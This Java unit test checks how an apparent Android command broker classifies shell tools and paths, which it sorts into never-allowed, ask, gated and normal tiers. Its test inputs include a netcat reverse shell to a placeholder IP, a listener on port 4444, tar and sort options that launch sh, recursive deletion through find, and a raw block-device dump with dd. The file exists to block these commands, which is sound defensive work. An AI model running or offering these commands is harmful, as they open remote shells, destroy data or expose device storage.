package app.plait.broker.server;

import static org.junit.Assert.assertEquals;
import static org.junit.Assert.assertFalse;
import static org.junit.Assert.assertNull;
import static org.junit.Assert.assertTrue;

import java.util.Arrays;

import org.junit.Test;

public class ToolsTest {
    private static Classifier.Tier tier(String... argv) {
        Classifier.Decision d = Tools.classify(Arrays.asList(argv));
        return d == null ? Classifier.Tier.NORMAL : d.tier;
    }

    private static boolean privileged(String... argv) {
        return Tools.privileged(Arrays.asList(argv));
    }

    @Test
    public void everyBusyBoxStyleToolIsKnown() {
        for (String t : new String[]{"ls", "cat", "grep", "tar", "wget", "nc", "ps", "kill", "mount", "reboot", "sh",
                "xargs", "dmesg", "uname", "md5sum", "find", "dd", "sed", "awk", "httpd", "ip", "getprop"}) {
            assertTrue(t, Tools.get(t) != null);
        }
        assertTrue(Tools.count() > 250);
        assertEquals("ls", Tools.get("/system/bin/ls").name);
    }

    @Test
    public void privilegedLocationsAreWhatOnlyTheShellReaches() {
        assertTrue(privileged("cat", "/proc/net/arp"));
        assertTrue(privileged("cat", "/data/local/tmp/x"));
        assertTrue(privileged("ls", "relative/path"));
        assertTrue(privileged("ls", "/system/../data"));
        assertFalse(privileged("cat", "/system/build.prop"));
        assertFalse(privileged("ls", "/sdcard//Download/"));
        assertFalse(privileged("cat"));          // standard input
        assertTrue(privileged("ls"));            // the current folder
        assertFalse(privileged("grep", "/data/secret", "/sdcard/a.txt")); // the first operand is the pattern
        assertTrue(privileged("grep", "-e", "x", "/data/local/tmp/a"));
        assertFalse(privileged("tail", "-n", "/data/x", "/sdcard/log")); // option values are not paths
        assertTrue(privileged("dd", "if=/dev/block/sda", "of=/sdcard/x"));
        assertTrue(privileged("wget", "-O", "/data/local/tmp/x", "http://a"));
        assertFalse(privileged("ping", "1.1.1.1"));
    }

    @Test
    public void toolsThatRunOtherProgramsAreNever() {
        assertEquals(Classifier.Tier.NEVER, tier("find", "/sdcard", "-exec", "rm", "{}", ";"));
        assertEquals(Classifier.Tier.NEVER, tier("tar", "--to-command=sh", "-xf", "a.tar"));
        assertEquals(Classifier.Tier.NEVER, tier("tar", "-I", "sh", "-cf", "a.tar", "x"));
        assertEquals(Classifier.Tier.NEVER, tier("nc", "-e", "/system/bin/sh", "1.2.3.4", "80"));
        assertEquals(Classifier.Tier.NEVER, tier("sort", "--compress-program=sh", "x"));
        assertEquals(Classifier.Tier.NEVER, tier("vi", "/sdcard/x"));
        assertEquals(Classifier.Tier.NEVER, tier("less", "/sdcard/x"));
        assertEquals(Classifier.Tier.NEVER, tier("run-parts", "/sdcard"));
    }

    @Test
    public void serversAndRootToolsAreNever() {
        assertEquals(Classifier.Tier.NEVER, tier("httpd", "-p", "8080"));
        assertEquals(Classifier.Tier.NEVER, tier("nc", "-l", "-p", "4444"));
        assertEquals(Classifier.Tier.NEVER, tier("insmod", "x.ko"));
        assertEquals(Classifier.Tier.NEVER, tier("ip", "addr", "add", "10.0.0.1/24", "dev", "wlan0"));
        assertEquals(Classifier.Tier.NEVER, tier("date", "-s", "2020-01-01"));
        assertEquals(Classifier.Tier.NORMAL, tier("ip", "neigh", "show"));
        assertEquals(Classifier.Tier.NORMAL, tier("date"));
    }

    @Test
    public void seeingOrStoppingProcessesIsAskedOrGated() {
        assertEquals(Classifier.Tier.ASK, tier("ps", "-A"));
        assertEquals("processes", Tools.classify(Arrays.asList("top", "-n", "1")).key);
        assertEquals("connections", Tools.classify(Arrays.asList("netstat", "-tn")).key);
        assertEquals(Classifier.Tier.ASK, tier("dmesg"));
        assertEquals(Classifier.Tier.GATED, tier("kill", "-9", "1234"));
        assertEquals(Classifier.Tier.GATED, tier("reboot"));
    }

    @Test
    public void ordinaryToolsKeepTheUsualRules() {
        assertNull(Tools.classify(Arrays.asList("ls", "-la", "/sdcard")));
        assertNull(Tools.classify(Arrays.asList("grep", "-ri", "x", "/sdcard")));
        assertNull(Tools.classify(Arrays.asList("tar", "-tzf", "/sdcard/a.tgz")));
        assertNull(Tools.classify(Arrays.asList("someprogram")));
    }
}
